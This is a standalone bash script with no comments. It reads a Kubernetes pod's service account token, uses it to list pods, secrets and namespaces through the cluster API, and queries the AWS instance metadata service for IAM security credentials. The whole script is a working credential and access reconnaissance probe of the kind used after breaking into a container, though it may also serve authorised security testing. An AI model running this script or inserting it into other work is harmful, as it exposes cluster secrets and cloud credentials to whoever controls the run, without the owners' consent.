#!/bin/bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
API="https://kubernetes.default.svc"
echo "=== TOKEN_EXISTS ==="
test -n "$TOKEN" && echo "YES" || echo "NO"
echo "=== LIST PODS ==="
curl -sk -m 10 -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/pods?limit=2 2>&1 | head -c 400
echo ""
echo "=== LIST SECRETS ==="
curl -sk -m 10 -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NS/secrets?limit=2 2>&1 | head -c 400
echo ""
echo "=== LIST NAMESPACES ==="
curl -sk -m 10 -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces?limit=5 2>&1 | head -c 400
echo ""
echo "=== AWS IMDS ==="
curl -s -m 5 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 300
echo ""
echo "=== AWS IAM ==="
curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 200